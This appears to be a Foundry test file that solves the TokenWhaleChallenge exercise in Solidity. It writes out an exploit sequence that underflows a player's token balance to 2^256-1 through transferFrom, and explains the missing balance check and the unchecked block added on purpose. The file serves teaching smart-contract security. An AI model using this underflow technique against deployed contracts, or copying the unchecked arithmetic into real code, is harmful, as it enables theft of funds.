// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Test, console2} from "forge-std/Test.sol";
import {TokenWhaleChallenge} from "../../src/Week6-7/Fuzzing/TokenWhaleChallenge.sol";

//forge test --match-contract TokenWhaleChallengeTest -vvvv
contract TokenWhaleChallengeTest is Test {
    address badPerson1;
    address badPerson2;
    TokenWhaleChallenge tokenWhaleChallenge;

    function setUp() public {
        badPerson1 = address(this);
        badPerson2 = address(0xbad);
        tokenWhaleChallenge = new TokenWhaleChallenge(badPerson1);
    }

    function testAttack() public {
        vm.startPrank(badPerson2);
        tokenWhaleChallenge.approve(badPerson1, 1000);

        vm.startPrank(badPerson1);
        tokenWhaleChallenge.transfer(badPerson2, 501); //left 499 in balance
        tokenWhaleChallenge.transferFrom(badPerson2, address(0x00), 500); //left -1 but underflows
        vm.stopPrank();

        //checks `badPerson1`'s balance, who is the player.
        require(tokenWhaleChallenge.isComplete(), "TokenWhaleChallenge not complete");
    }
}

//Modifications:
// Since we are using solidity ^0.8.x, an unchecked block was added in the `_transfer` function to
// mimic what might happen in solidity ^0.4.21, which was what the original contract was written in.
//
//Exploit:
// The exploit involves underflowing the balance of the player, which is `badPerson1`,
// during the `transferFrom` call.
//
// First `badPerson2` approves `badPerson1` to spend 1000 tokens. Then `badPerson1` transfers 501 tokens
// to `badPerson2`, leaving `badPerson1` with 499 tokens. Then `badPerson1` calls `transferFrom` to
// transfer 500 tokens from `badPerson2` to the zero address. When the `_transfer` function is called,
// the balance of `badPerson1` will be the result of 499 - 500, which underflows to 2^256 - 1. This
// leaves `badPerson1` with a balance of 2^256 - 1.
//
// The root of the exploit lies in the `_transfer` function, where the balance of the sender is
// not required to be greater than or equal to the value being transferred. If this contract was
// run in solidity ^0.8.x, the exploit would not work because the `_transfer` function would revert
// from the underflow.
